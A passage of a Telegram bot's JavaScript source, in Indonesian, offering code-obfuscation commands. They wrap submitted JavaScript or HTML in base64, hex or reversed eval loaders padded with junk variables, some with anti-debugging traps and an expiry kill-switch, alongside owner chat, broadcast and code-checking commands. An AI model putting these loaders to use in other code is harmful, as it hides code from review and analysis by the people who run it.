  return crypto.randomBytes(length).toString("hex")
}

function randomName(list){
  const extra=["ツ","々","〆","メ","ん","ฬ","刃","ฬ"]
  return list[Math.floor(Math.random()*list.length)] +
    extra[Math.floor(Math.random()*extra.length)] +
    Math.floor(Math.random()*99999)
}

function chaosVars(total=500,names=[]){
  let out=""
  for(let i=0;i<total;i++){
    out += `var ${randomName(names)}="${randomHex(80)}";\n`
  }
  return out
}

function makeB64Style(code,names,count=500){
  const b64 = Buffer.from(code).toString("base64")
  const funcName = randomName(names)
  const varName = randomName(names)

  return `(function(){
${chaosVars(count,names)}
function ${funcName}(){
const ${varName}="${b64}";
return Buffer.from(${varName},"base64").toString();
}
eval(${funcName}());
})();`
}

function artilleryStyle(code){
  return makeB64Style(code,["つき","さくら","ほし","ゆき","ねこ","みず","かぜ","やみ"],600)
}

function hardcoreStyle(code){
  const names=["悪魔","闇","無限","崩壊","零","死神","幻","滅"]
  const b64=Buffer.from(code).toString("base64")
  const funcName=randomName(names)
  const varName=randomName(names)

  return `(function(){
${chaosVars(1000,names)}
setInterval(()=>{debugger},1)
console.clear()
function ${funcName}(){
const ${varName}="${b64}";
return Buffer.from(${varName},"base64").toString();
}
eval(${funcName}());
})();`
}

function phantomStyle(code){
  const hex=Buffer.from(code).toString("hex")
  return `eval(Buffer.from("${hex}","hex").toString())`
}

function balancedStyle(code){
  return makeB64Style(code,["均衡","静","風","月"],300)
}

function reversedStyle(code){
  const rev=code.split("").reverse().join("")
  return `eval("${rev}".split("").reverse().join(""))`
}

function rosemaryStyle(code){
  return makeB64Style(code,["薔薇","深夜","死","夢"],800)
}

function invisStyle(code){
  const uni=escape(Buffer.from(code).toString("base64"))
  return `eval(Buffer.from(unescape("${uni}"),"base64").toString())`
}

function japanStyle(code){
  return makeB64Style(code,["つき","さくら","ほし","ねこ","そら","ゆき","みず","かぜ","れい","やみ","むげん","はな"],1500)
}

function arabStyle(code){
  return makeB64Style(code,["سلام","قمر","نور","ليل","شمس","نار","روح","موت"],900)
}

function siuStyle(code){
  return makeB64Style(code,["SIUU","RONALDO","GOAL","CR7"],600)
}

function nebulaStyle(code){
  return makeB64Style(code,["星雲","宇宙","銀河","闇","ブラック","無限","ゼロ"],2500)
}

function varStyle(code){
  return `(function(){${code}})();`
}

function customStyle(code,name){
  const names=["改造","極限","混乱","破壊","地獄","暗黒","虚無"]
  const b64=Buffer.from(code).toString("base64")
  const funcName = /^[A-Za-z_$][A-Za-z0-9_$]*$/.test(name) ? name : "CustomLoader"
  const varName=randomName(names)

  return `(function(){
${chaosVars(1200,names)}
function ${name}(){
const ${varName}="${b64}";
return Buffer.from(${varName},"base64").toString();
}
eval(${funcName}());
})();`
}

function timeLockStyle(code,days){
  const expired=Date.now()+(Number(days)*86400000)
  const b64=Buffer.from(code).toString("base64")

  return `(function(){
if(Date.now()>${expired}){
console.log("Script Expired");
process.exit();
}
eval(Buffer.from("${b64}","base64").toString());
})();`
}


// COMMAND
// /artillery
bot.command(
'artillery',
(ctx)=>
processObfuscate(
ctx,
artilleryStyle,
'Artillery'
)
)

// /hardcore
bot.command(
'hardcore',
(ctx)=>
processObfuscate(
ctx,
hardcoreStyle,
'Hardcore'
)
)

// /phantom
bot.command(
'phantom',
(ctx)=>
processObfuscate(
ctx,
phantomStyle,
'Phantom'
)
)

// /balanced
bot.command(
'balanced',
(ctx)=>
processObfuscate(
ctx,
balancedStyle,
'Balanced'
)
)

// /reversed
bot.command(
'reversed',
(ctx)=>
processObfuscate(
ctx,
reversedStyle,
'Reversed'
)
)

// /rosemary
bot.command(
'rosemary',
(ctx)=>
processObfuscate(
ctx,
rosemaryStyle,
'Rosemary'
)
)

// /invisenc
bot.command(
'invisenc',
(ctx)=>
processObfuscate(
ctx,
invisStyle,
'InvisEnc'
)
)

// /japanenc
bot.command(
'japanenc',
(ctx)=>
processObfuscate(
ctx,
japanStyle,
'japanenc'
)
)

// /encarab
bot.command(
'encarab',
(ctx)=>
processObfuscate(
ctx,
arabStyle,
'encarab'
)
)

// /siuenc
bot.command(
'siuenc',
(ctx)=>
processObfuscate(
ctx,
siuStyle,
'siuenc'
)
)

// /japan
bot.command(
'japan',
(ctx)=>
processObfuscate(
ctx,
japanStyle,
'Japan'
)
)

// /nebula
bot.command(
'nebula',
(ctx)=>
processObfuscate(
ctx,
nebulaStyle,
'Nebula'
)
)

// /var
bot.command(
'var',
(ctx)=>
processObfuscate(
ctx,
varStyle,
'Var'
)
)

// /enctime
bot.command(
'enctime',
async(ctx)=>{

const days =
ctx.message.text
.split(' ')[1]

if(!days){

return ctx.reply(
'❌ Example : /enctime 30'
)

}

await processObfuscate(
ctx,
(code)=>timeLockStyle(code, days),
'EncTime'
)

}
)

// /enccustom
bot.command(
'enccustom',
async(ctx)=>{

const text =
ctx.message.text
.split(' ')
.slice(1)
.join(' ')

if(!text){

return ctx.reply(
'❌ Example : /enccustom SabilOfficial'
)

}

await processObfuscate(
ctx,
(code)=>customStyle(code, text),
'EncCustom'
)

}
)

// ==================== HARDHTML ====================

bot.command("hardhtml", async (ctx) => {

try {

if (!ctx.message.reply_to_message?.document) {
return ctx.reply("Reply file html.");
}

const file =
await ctx.telegram.getFile(
ctx.message.reply_to_message.document.file_id
)

const link = `https://api.telegram.org/file/bot${config.BOT_TOKEN}/${file.file_path}`

const res =
await axios.get(link)

const html = res.data

const b64 =
Buffer
.from(html)
.toString("base64")

let anti = ""

for(let i=0;i<800;i++){

anti += `
var _${randomHex(8)}="${randomHex(50)}";
`

}

const result = `
<script>
${anti}
setInterval(()=>{
debugger
},1)
eval(
atob(
"${b64}"
)
)
</script>
`

await ctx.replyWithDocument({
source: Buffer.from(result),
filename: "hardhtml.html"
})

} catch(e){

ctx.reply(String(e))

}

})

// ==================== INVISHTML ====================

bot.command("invishtml", async (ctx) => {

try {

if (!ctx.message.reply_to_message?.document) {
return ctx.reply("Reply file html.");
}

const file =
await ctx.telegram.getFile(
ctx.message.reply_to_message.document.file_id
)

const link = `https://api.telegram.org/file/bot${config.BOT_TOKEN}/${file.file_path}`

const res =
await axios.get(link)

const html = res.data

const uni =
escape(
Buffer
.from(html)
.toString("base64")
)

const result = `
<script>
eval(
atob(
unescape(
"${uni}"
)
)
)
</script>
`

await ctx.replyWithDocument({
source: Buffer.from(result),
filename: "invishtml.html"
})

} catch(e){

ctx.reply(String(e))

}

})

// ==================== GETSOURCE ====================

bot.command("getsource", async (ctx) => {

try {

const url =
ctx.message.text
.split(" ")
.slice(1)
.join(" ")

if(!url){
return ctx.reply(
"Example:\n/getsource https://example.com"
)
}

const res =
await axios.get(url)

const html = res.data

await ctx.replyWithDocument({
source: Buffer.from(html),
filename: "source.html"
})

} catch(e){

ctx.reply(String(e))

}

})

bot.command("cekcode", async (ctx) => {
try {

if (!ctx.message.reply_to_message)
return ctx.reply("Reply function JavaScript yang ingin dicek.")

const text =
ctx.message.reply_to_message.text ||
ctx.message.reply_to_message.caption

if (!text)
return ctx.reply("Pesan yang direply tidak berisi kode.")

let acorn
try {
acorn = require("acorn")
} catch {
return ctx.reply("Module acorn belum terinstall.\nInstall dengan: npm install acorn")
}

try {

acorn.parse(text, {
ecmaVersion: "latest",
sourceType: "module",
locations: true
})

return ctx.reply(`🔎 Mengecek Code.....

Asekk Ga ada Error Cuy Di Code Nya.`)

} catch (err) {

const lines = text.split("\n")
const line = err.loc.line
const column = err.loc.column

const start = Math.max(0, line - 3)
const end = Math.min(lines.length, line + 2)

const snippet = lines.slice(start, end).map((l, i) => {
const num = start + i + 1
return num === line
? `👉 ${num} | ${l}`
: `   ${num} | ${l}`
}).join("\n")

return ctx.reply(`Yahhh Code Nya Error Ni Fixed Dong

${err.message}
Line ${line}:${column}

📌 Cuplikan:
${snippet}`)

}

} catch (e) {
console.error(e)
ctx.reply("Terjadi error saat mengecek code.")
}

});

// ==================== INFOERROR ====================

bot.command("infoerror", async (ctx) => {

try {

if (!ctx.message.reply_to_message?.document) {
return ctx.reply("Reply file js.");
}

const file =
await ctx.telegram.getFile(
ctx.message.reply_to_message.document.file_id
)

const link = `https://api.telegram.org/file/bot${config.BOT_TOKEN}/${file.file_path}`

const res =
await axios.get(link)

let code = res.data

let info = []

if(code.includes("eval(eval(")){
info.push("Nested eval detected")
}

if(code.includes("debugger")){
info.push("Debugger detected")
}

if(code.includes("while(true)")){
info.push("Infinite loop detected")
}

if(code.length > 500000){
info.push("File too large")
}

if(info.length < 1){
info.push("No problem detected")
}

ctx.reply(
`INFO ERROR:\n\n- ${info.join("\n- ")}`
)

} catch(e){

ctx.reply(String(e))

}

})

// ==================== FIXFUNC ====================

bot.command("fixfunc", async (ctx) => {

try {

if (!ctx.message.reply_to_message?.document) {
return ctx.reply("Reply file js.");
}

const file =
await ctx.telegram.getFile(
ctx.message.reply_to_message.document.file_id
)

const link = `https://api.telegram.org/file/bot${config.BOT_TOKEN}/${file.file_path}`

const res =
await axios.get(link)

let code = res.data

code = code
.replace(/debugger;/g,"")
.replace(/while\s*\(\s*true\s*\)/g,"while(false)")
.replace(/eval\(eval\(/g,"eval(")

await ctx.replyWithDocument({
source: Buffer.from(code),
filename: "fixed.js"
})

} catch(e){

ctx.reply(String(e))

}

})

// =============================
// CMD BACKUP
// =============================
bot.command("backup", async (ctx) => {

        const userId =
            Number(ctx.from.id)

        // owner only
        if (userId !== config.OWNER_ID) {

            return ctx.reply(
                "❌ Owner only."
            )
        }

        await ctx.reply(
            "📦 Membuat backup..."
        )

        await sendBackup(
            "Manual Backup"
        )

        await ctx.reply(
            "✅ Backup berhasil dikirim ke owner."
        )
})

// =============================
// CMD CHATADMIN
// =============================
bot.command("chatowner", async (ctx) => {

    const userId = Number(ctx.from.id)
    const OWNER_ID = Number(config.OWNER_ID)

    if (userId === OWNER_ID) {
        return ctx.reply(
            "Command ini hanya untuk user."
        )
    }

    CHAT_SESSION[userId] = true

    const kb = {
        inline_keyboard: [[
            {
                text: "❌ Batalkan",
                callback_data: "cancel_chat_admin"
            }
        ]]
    }

    await ctx.reply(
`
<blockquote><b>💬 CHAT OWNER</b></blockquote>
<blockquote>
Silahkan kirim pesan anda untuk owner.
Pesan akan langsung diteruskan ke owner.
</blockquote>
`,
        {
            parse_mode: "HTML",
            reply_markup: kb
        }
    )

})

bot.action("cancel_chat_admin", async (ctx) => {

    const userId = Number(ctx.from.id)

    delete CHAT_SESSION[userId]

    await ctx.editMessageText(
`
<blockquote><b>❌ Chat Owner Dibatalkan</b></blockquote>
`,
        {
            parse_mode: "HTML"
        }
    )

    await ctx.answerCbQuery(
        "Chat dibatalkan."
    )

})

bot.on("text", async (ctx, next) => {

    const userId = Number(ctx.from.id)
    const OWNER_ID = Number(config.OWNER_ID)

    if (userId === OWNER_ID)
        return next()

    if (!CHAT_SESSION[userId])
        return next()

    if (ctx.message.text.startsWith("/"))
        return next()

    const waktu = new Date()
        .toLocaleString("id-ID")

    console.log(
        "[CHATOWNER]",
        userId,
        ctx.message.text
    )

    const sent =
        await bot.telegram.sendMessage(
            OWNER_ID,
`
<blockquote><b>📩 PESAN USER</b></blockquote>
<blockquote>
👤 Username : @${ctx.from.username || "Tidak ada"}
🆔 ID : <code>${userId}</code>
🕒 Waktu : ${waktu}
📝 Pesan :
${ctx.message.text}</blockquote>
<blockquote><b>Reply pesan ini untuk membalas user.</b></blockquote>
`,
            {
                parse_mode: "HTML"
            }
        ).catch(err => {

            console.log(
                "[SEND OWNER ERROR]",
                err
            )

            return null

        })

    if (!sent) {

        return ctx.reply(
            "❌ Gagal mengirim pesan ke owner."
        )

    }

    REPLY_MAP[
        sent.message_id
    ] = userId

    await ctx.reply(
`
<blockquote><b>✅ Pesan Berhasil Dikirim</b></blockquote>
<blockquote>Tunggu hingga owner membalas pesan anda.</blockquote>
`,
        {
            parse_mode: "HTML"
        }
    )

})

bot.on("text", async (ctx, next) => {

    const ownerId =
        Number(ctx.from.id)

    const OWNER_ID =
        Number(config.OWNER_ID)

    if (ownerId !== OWNER_ID)
        return next()

    const reply =
        ctx.message.reply_to_message

    if (!reply)
        return next()

    if (ctx.message.text.startsWith("/"))
        return next()

    const targetUser =
        REPLY_MAP[
            reply.message_id
        ]

    if (!targetUser)
        return next()

    await bot.telegram.sendMessage(
        targetUser,
`
<blockquote><b>💬 BALASAN OWNER</b></blockquote>
<blockquote>${ctx.message.text}</blockquote>
`,
        {
            parse_mode: "HTML"
        }
    ).catch(err => {

        console.log(
            "[REPLY USER ERROR]",
            err
        )

    })

    await ctx.reply(
        "✅ Balasan berhasil dikirim."
    )

})

bot.command("broadcast", async (ctx) => {

    if (ctx.from.id !== config.OWNER_ID) {
        return ctx.reply(
            "❌ Khusus Owner"
        )
    }

    if (!ctx.message.reply_to_message) {
        return ctx.reply(
            "Reply pesan dengan command /broadcast"
        )
    }

    if (!fs.existsSync(ACCESS_FILE)) {
        return ctx.reply(
            "❌ Database user tidak ditemukan."
        )
    }

    const db = JSON.parse(
        fs.readFileSync(
            ACCESS_FILE,
            "utf8"
        )
    )

    const users = Object.keys(
        db.users || {}
    )
    .map(id => Number(id))
    .filter(
        id =>
        id !== config.OWNER_ID
    )

    if (!users.length) {
        return ctx.reply(
            "❌ Tidak ada user terdaftar."
        )
    }

    const replyMsg =
        ctx.message.reply_to_message

    const waitMsg =
        await ctx.reply(
`<pre>▱▱▱▱▱▱▱▱▱▱▱ 0%</pre>
Memulai Broadcast...`,
            {
                parse_mode: "HTML"
            }
        )

    const steps = [
        {
            percent: 10,
            text: "⚙️ Mengambil Database User",
            delay: 500
        },
        {
            percent: 40,
            text: "⚙️ Menyiapkan Broadcast",
            delay: 700
        },
        {
            percent: 50,
            text: "⚙️ Memvalidasi User Aktif",
            delay: 600
        },
        {
            percent: 70,
            text: "⚙️ Mengirim Broadcast",
            delay: 800
        },
        {
            percent: 90,
            text: "⚙️ Menyelesaikan Broadcast",
            delay: 600
        },
        {
            percent: 100,
            text: "✅ Broadcast Siap Dikirim",
            delay: 500
        }
    ]

    for (const step of steps) {

        const barLength = 11

        const filled =
            Math.round(
                (
                    step.percent /
                    100
                ) *
                barLength
            )

        const bar =
            "▰".repeat(
                filled
            ) +
            "▱".repeat(
                barLength -
                filled
            )

        await ctx.telegram
        .editMessageText(
            waitMsg.chat.id,
            waitMsg.message_id,
            undefined,
`<pre>${bar} ${step.percent}%
${step.text}</pre>
⋘ 𝑃𝑙𝑒𝑎𝑠𝑒 𝑤𝑎𝑖𝑡... ⋙
`,
            {
                parse_mode:
                "HTML"
            }
        )
        .catch(() => {})

        await pause(
            step.delay
        )

    }

    let success = 0
    let failed = 0

    for (const userId of users) {

        try {

            await ctx.telegram
            .copyMessage(
                userId,
                ctx.chat.id,
                replyMsg.message_id
            )

            success++

        } catch (err) {

            console.log(
                `Broadcast gagal ke ${userId}`,
                err.message
            )

            failed++

        }

        await pause(100)

    }

    await ctx.telegram
    .deleteMessage(
        ctx.chat.id,
        waitMsg.message_id
    )
    .catch(() => {})

    await ctx.reply(
`<blockquote>📢 <b>BROADCAST SELESAI</b></blockquote>
<blockquote>
✅ Berhasil : ${success}
❌ Gagal : ${failed}
👥 Total : ${users.length}</blockquote>
<blockquote>Broadcast berhasil dikirim ke seluruh user aktif.</blockquote>`,
        {
            parse_mode:
            "HTML"
        }
    )

})

// =============================
// MAINTENANCE COMMAND
// =============================
bot.command("maintenance", async (ctx) => {

    const userId = Number(ctx.from.id)

    // owner only
    if (userId !== config.OWNER_ID) {
        return ctx.reply("❌ Khusus owner.")
    }

    const text = ctx.message.text

    // ambil args
    const args = text.split(" ").slice(1).join(" ")

    // kalau kosong
    if (!args) {
        return ctx.reply(`\`\`\`js
📌 Maintenance Mode

/maintenance on|update system
/maintenance off|maintenance selesai\`\`\`
            `,
            {
                parse_mode: "Markdown"
            }
        )
    }

    // split on/off dan alasan
    const [mode, ...reasonArray] = args.split("|")

    const input = mode.trim().toLowerCase()

    const reason = reasonArray.join("|").trim() || "Tidak ada alasan"

    // =============================
    // ON
    // =============================
    if (input === "on") {

        fs.writeFileSync(
            PATH_MAINTENANCE,
            JSON.stringify({
                status: true,
                reason
            }, null, 2)
        )

        return ctx.reply(
            `\`\`\`js
🛠 Maintenance Enabled

📌 Status : ON
📝 Alasan : ${reason}\`\`\`
            `,
            {
                parse_mode: "Markdown"
            }
        )
    }

    // =============================
    // OFF
    // =============================
    if (input === "off") {

        fs.writeFileSync(
            PATH_MAINTENANCE,
            JSON.stringify({
                status: false,
                reason
            }, null, 2)
        )

        return ctx.reply(
            `\`\`\`js
✅ Maintenance Disabled

📌 Status : OFF
📝 Keterangan : ${reason}\`\`\`
            `,
            {
                parse_mode: "Markdown"
            }
        )
    }

    // invalid
    return ctx.reply(
        `\`\`\`js
✘ Format Salah

/maintenance on|alasan
/maintenance off|alasan\`\`\`
        `,
        {
            parse_mode: "Markdown"
        }
    )
})
// ==================== COMMAND /CLAUDE ====================
bot.command('ai', async (ctx) => {

    const chatId = ctx.chat.id;
    const ownerId = config.OWNER_ID;
    const sessionFp = path.join(__dirname, './database/ai.json');

    // Cek maintenance (jika fungsi isMaintenance ada)
    if (typeof isMaintenance === 'function' && isMaintenance() && chatId !== ownerId) {
        return ctx.reply('🛠 Bot sedang maintenance.');
    }

    // Ambil teks setelah /claude
    const q = ctx.message.text.replace(/^\/ai\s*/, '').trim();
    if (!q) {
        return ctx.reply('Ketik /ai sambil isi pesan yang ingin di tanyakan');
    }

    // Kirim pesan "sedang memproses..."
    const waitMsg = await ctx.reply('Waiting...');

    // Fungsi load/save session
    const loadAI = () => {
        try {
            if (!fs.existsSync(sessionFp)) {
                fs.writeJsonSync(sessionFp, {});
                return {};
            }
            return fs.readJsonSync(sessionFp);
        } catch (e) {
            console.error('[AI-SESS-ERR]', e.message);
            return {};
        }
    };
    const saveAI = (data) => {
        try {
            fs.writeJsonSync(sessionFp, data, { spaces: 2 });
        } catch (e) {
            console.error('[AI-SAVE-ERR]', e.message);
        }
    };
    const getSession = (uid, db) => {
        if (!db[uid]) db[uid] = [];
        return db[uid];
    };

    try {
        const uid = ctx.from.id.toString();
        const aiDb = loadAI();
        const sess = getSession(uid, aiDb);

        sess.push({ role: 'user', content: q });
        if (sess.length > 20) aiDb[uid] = sess.slice(-10);

        const systemPrompt = `
Aturan format jawaban:
- Gunakan Markdown Telegram sederhana (bold, bullet).
- Dilarang menggunakan tabel.
- Jika penjelasan biasa, pakai teks dan bullet saja.
- Jika ada kode, gunakan blok kode (\`\`\`) sesuai bahasa.
- Jangan gunakan emoji berlebihan.
- Langsung to the point, jangan ulang pertanyaan user.
- Pastikan output aman untuk Telegram tanpa error parse.
Session Memory:
- Lihat history chat terakhir (max 10 pesan).
- Lanjutkan konteks percakapan sebelumnya.
- Ingat detail yang sudah disebutkan user.`.trim();

        const chatHistory = [
            { role: 'system', content: systemPrompt },
            ...sess.slice(-10),
        ];

        const { data } = await axios.post(
            'https://aliicia.my.id/api/chatgpt',
            { message: chatHistory },
            { headers: { 'Content-Type': 'application/json' } }
        );

        let ans = (data?.response || 'Gagal mendapatkan jawaban.')
            .replace(/\u0000/g, '').replace(/\r\n/g, '\n').replace(/\r/g, '\n').trim();

        sess.push({ role: 'assistant', content: ans });
        saveAI(aiDb);

        // Fungsi split untuk memotong pesan > 4000 karakter (batas aman Telegram 4096)
        const splitResponse = (text, maxLen = 4000) => {
            const parts = [];
            const codeRx = /```[\s\S]*?```/g;
            const segs = [];
            let lastIdx = 0, m;

            while ((m = codeRx.exec(text)) !== null) {
                if (m.index > lastIdx) segs.push({ t: 'text', v: text.substring(lastIdx, m.index) });
                segs.push({ t: 'code', v: m[0] });
                lastIdx = m.index + m[0].length;
            }
            if (lastIdx < text.length) segs.push({ t: 'text', v: text.substring(lastIdx) });

            let cur = '';
            for (const seg of segs) {
                if ((cur.length + seg.v.length) <= maxLen) {
                    cur += seg.v;
                } else {
                    if (cur.trim()) parts.push(cur.trim());
                    if (seg.t === 'code' && seg.v.length > maxLen) {
                        const inner = seg.v.substring(3, seg.v.length - 3);
                        const lang = (seg.v.match(/^```(\w+)/) || ['', ''])[1];
                        const lines = inner.split('\n');
                        let chunk = `\`\`\`${lang}\n`;
                        for (const ln of lines) {
                            if ((chunk.length + ln.length + 1) > maxLen - 3) {
                                chunk += '```';
                                parts.push(chunk);
                                chunk = `\`\`\`${lang}\n${ln}\n`;
                            } else {
                                chunk += ln + '\n';
                            }
                        }
                        if (chunk.trim() !== `\`\`\`${lang}`) {
                            chunk += '```';
                            cur = chunk;
                        } else {
                            cur = '';
                        }
                    } else {
                        cur = seg.v;
                    }
                }
            }
            if (cur.trim()) parts.push(cur.trim());
            return parts;
        };

        const chunks = splitResponse(ans, 4000);
        // Hapus pesan "sedang memproses..."
        await ctx.deleteMessage(waitMsg.message_id).catch(() => {});
        // Kirim setiap bagian
        for (const chunk of chunks) {
            await ctx.reply(chunk, { parse_mode: 'Markdown' });
        }
    } catch (err) {
        console.error('[AI-ERR]', err.message);
        await ctx.deleteMessage(waitMsg.message_id).catch(() => {});
        ctx.reply('❌ Terjadi error: ' + err.message);
    }
});

bot.command("cekerror", async (ctx) => {

    const rep = ctx.message.reply_to_message

    let code = ""
    let fileName = "code"

    if (rep?.document) {

        const ext = path
            .extname(rep.document.file_name)
            .toLowerCase()

        const allowed = [
            ".js",
            ".json",
            ".html",
            ".py"
        ]

        if (!allowed.includes(ext)) {

            return ctx.reply(
                "❌ Format yang didukung:\n.js\n.json\n.html\n.py"
            )

        }

        fileName =
            rep.document.file_name

        try {

            code =
                await downloadTgFile(
                    ctx.telegram,
                    rep.document.file_id
                )

        } catch (e) {

            return ctx.reply(
                `❌ Gagal download file:\n${e.message}`
            )

        }

    } else if (rep?.text) {

        code =
            rep.text.trim()

    } else {

        return ctx.reply(
`
<b>Cara Pakai</b>

Reply kode atau file:

• .js
• .json
• .html
• .py

Lalu ketik:

<code>/cekerror</code>
`,
            {
                parse_mode: "HTML"
            }
        )

    }

    if (!code.trim()) {

        return ctx.reply(
            "❌ Kode kosong."
        )

    }

    const waitMsg =
        await ctx.reply(
            "🔍 Menganalisis Error..."
        )

    try {

        const {
            errorMsg,
            errorLine,
            fixSuggest,
            annotated,
            hasError
        } = analyseCode(code)

        await ctx.telegram
            .deleteMessage(
                waitMsg.chat.id,
                waitMsg.message_id
            )
            .catch(() => {})

        if (!hasError) {

            return ctx.reply(
`
✅ Tidak ditemukan error.
📄 File : <code>${fileName}</code>
`,
                {
                    parse_mode: "HTML"
                }
            )

        }

        const result =
`
HASIL ANALISIS ERROR
────────────────────────────

File : ${fileName}
Ukuran : ${Buffer.byteLength(code)}
Baris Error :
${errorLine || "-"},

Jenis Error :
${errorMsg}

────────────────────────────

Saran Perbaikan :
${fixSuggest}

────────────────────────────

Cuplikan Error :
${annotated}

────────────────────────────
Analisis File/Code Selesai
`

        if (result.length <= 3500) {

            return ctx.reply(
                `\`\`\`js
                ${esc(result)}\`\`\``,
                {
                    parse_mode: "Markdown"
                }
            )

        }

        const txtFile =
            path.join(
                __dirname,
                `analisis-error-${Date.now()}.txt`
            )

        fs.writeFileSync(
            txtFile,
            result
        )

        await ctx.replyWithDocument(
            {
                source: txtFile,
                filename: "analisis-error.js"
            },
            {
                caption:
                    "📄 Analisis terlalu panjang dikirim via file.js"
            }
        )

        fs.unlinkSync(txtFile)

    } catch (err) {

        await ctx.telegram
            .deleteMessage(
                waitMsg.chat.id,
                waitMsg.message_id
            )
            .catch(() => {})

        return ctx.reply(
`
❌ Gagal menganalisis file
${err.message}
`
        )

    }

});

bot.command("cekidemoji", async (ctx) => {
  const reply = ctx.message.reply_to_message;

  if (!reply) {
    return ctx.reply(
      `<blockquote>⬡ <b>Cek Emoji Premium</b>\n\nReply ke pesan yang mengandung <b>custom emoji</b>, lalu kirim <code>/cekidemoji</code></blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  const collect = (ents = []) =>
    ents.filter(e => e.type === "custom_emoji").map(e => e.custom_emoji_id);

  const unique = [...new Set([
    ...collect(reply.entities),
    ...collect(reply.caption_entities)
  ])];

  if (unique.length === 0) {
    return ctx.reply(
      `<blockquote>⬡ <b>Cek Emoji Premium</b>\n\n${E.err} Tidak ada custom emoji terdeteksi.</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  // Fetch extra info dari Telegram API
  let stickerMap = {};
  try {
    const res = await ctx.telegram.callApi('getCustomEmojiStickers', {
      custom_emoji_ids: unique.slice(0, 200)
    });
    if (Array.isArray(res)) res.forEach(s => { stickerMap[s.custom_emoji_id] = s; });
  } catch { /* silent */ }

  const sender = reply.from?.username
    ? `@${reply.from.username}`
    : (reply.from?.first_name || 'Unknown');

  // Kirim header dulu
  let header = `<blockquote>⬡ <b>Custom Emoji Detected</b>\n\n`;
  header    += `${E.user} Dari  : ${sender}\n`;
  header    += `${E.total} Total : <b>${unique.length}</b> emoji</blockquote>`;
  await ctx.reply(header, { parse_mode: "HTML" });

  // Kirim tiap emoji satu per satu agar preview tampil jelas
  for (let i = 0; i < unique.length; i++) {
    const id = unique[i];
    const s  = stickerMap[id];

    // Fallback karakter unicode jika bukan premium — tampil di semua user
    const fallback = s?.emoji || '✨';

    // Preview: gunakan tg-emoji tag langsung (akan render di premium),
    // fallback otomatis ke karakter unicode di non-premium
    const preview = `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;

    // Label tipe
    const isPremium = s?.is_premium_sticker ?? false;
    const tipeLabel = isPremium
      ? `${E.ok} <b>Premium</b>`
      : `${E.emoFree} <b>Free</b>`;

    // Set name jika ada
    const setLine = s?.set_name
      ? `\n${E.set} Set  : <code>${s.set_name}</code>`
      : '';

    let block = `<blockquote><b>${i + 1}.</b> ${preview}  Preview\n`;
    block    += `${E.info2} ID   : <code>${id}</code>\n`;
    block    += `${tipeLabel}${setLine}\n`;
    block    += `${E.doc} Cara pakai:\n`;
    block    += `<code>&lt;tg-emoji emoji-id="${id}"&gt;${fallback}&lt;/tg-emoji&gt;</code></blockquote>`;

    await ctx.reply(block, { parse_mode: "HTML" });
  }
});

bot.command("fixerror", async ctx => {

  const rep = ctx.message.reply_to_message
  let code  = ""

  if (rep?.document?.file_name?.endsWith(".js")) {
    try { code = await downloadTgFile(ctx.telegram, rep.document.file_id) }
    catch (e) { return ctx.reply(`Gagal download file: ${e.message}`) }
  } else if (rep?.text) {
    code = rep.text.trim()
  } else {
    return ctx.reply(
`<blockquote><b>Cara pakai /fixerror</b>

Reply ke pesan berisi kode JavaScript,
lalu ketik /fixerror

Atau reply ke file .js</blockquote>`,
      { parse_mode: "HTML" })
  }

  if (!code) return ctx.reply("Kode kosong.")

  const loading = await ctx.reply("Menganalisa dan memperbaiki kode...")
  const before                     = analyseCode(code)
  const { fixed, fixNotes, result } = tryAutoFix(code)
  const success                    = !result.hasError

  await ctx.telegram.deleteMessage(ctx.chat.id, loading.message_id).catch(() => {})

  if (success) {
    const out =
`HASIL FIX ERROR — BERHASIL
───────────────────────────
Error Awal : ${before.errorMsg || "—"}
Baris      : ${before.errorLine ? `Baris ke-${before.errorLine}` : "Tidak terdeteksi"}
Saran      : ${before.fixSuggest || "—"}
Fix        : ${fixNotes.join(" | ") || "Auto-fixed"}
───────────────────────────

SEBELUM (dengan anotasi error):

${before.annotated}

───────────────────────────

SESUDAH (kode diperbaiki):

${renderAnnotated(fixed, null)}`

    await ctx.reply(`<pre>${esc(out)}</pre>`, { parse_mode: "HTML" })

    const tmp = path.join(BASE_DIR, `fixed_${Date.now()}.js`)
    fs.writeFileSync(tmp, fixed)
    await ctx.replyWithDocument({ source: tmp, filename: "fixed_code.js" }, { caption: "File .js hasil perbaikan otomatis" })
    fs.unlinkSync(tmp)
  } else {
    const out =
`<blockquote>HASIL FIX ERROR — GAGAL DIPERBAIKI OTOMATIS
───────────────────────────
Error  : ${result.errorMsg}
Baris  : ${result.errorLine ? `Baris ke-${result.errorLine}` : "Tidak terdeteksi"}
Saran  : ${result.fixSuggest}
───────────────────────────

KODE + ANOTASI:

${result.annotated}</blockquote>`

    await ctx.reply(`<pre>${esc(out)}</pre>`, { parse_mode: "HTML" })
  }
});

bot.command("cleancode", async ctx => {

  const rep = ctx.message.reply_to_message
  let code  = ""

  if (rep?.document?.file_name?.endsWith(".js")) {
    try { code = await downloadTgFile(ctx.telegram, rep.document.file_id) }
    catch (e) { return ctx.reply(`Gagal download file: ${e.message}`) }
  } else if (rep?.text) {
    code = rep.text.trim()
  } else {
    return ctx.reply(
`<blockquote><b>Cara pakai /cleancode</b>

Reply ke pesan berisi kode JavaScript,
lalu ketik /cleancode

Atau reply ke file .js</blockquote>`,
      { parse_mode: "HTML" })
  }

  if (!code) return ctx.reply("Kode kosong.")

  const loading = await ctx.reply("Merapikan kode...")
  const cleaned = cleanCode(code)
  await ctx.telegram.deleteMessage(ctx.chat.id, loading.message_id).catch(() => {})

  const out = `HASIL CLEAN CODE\n${"─".repeat(27)}\n\n${cleaned}`
  await ctx.reply(`<pre>${esc(out)}</pre>`, { parse_mode: "HTML" })

  const tmp = path.join(BASE_DIR, `clean_${Date.now()}.js`)
  fs.writeFileSync(tmp, cleaned)
  await ctx.replyWithDocument({ source: tmp, filename: "clean_code.js" }, { caption: "File .js hasil Clean Code" })
  fs.unlinkSync(tmp)
});

bot.command( "cekupdate", async (ctx) => {
if (
        Number(ctx.from.id) !==
        Number(config.OWNER_ID)
    ) {

        return ctx.reply(
            "<blockquote><b>❌ Khusus Owner</b></blockquote>",
            {
                parse_mode: "HTML"
            }
        )

    }

    const waitMsg =
        await ctx.reply(
            "<blockquote><b>🔍 Mengecek pembaruan...</b></blockquote>",
            {
                parse_mode: "HTML"
            }
        )

    try {

        const localCode =
            fs.existsSync(
                "./index.js"
            )
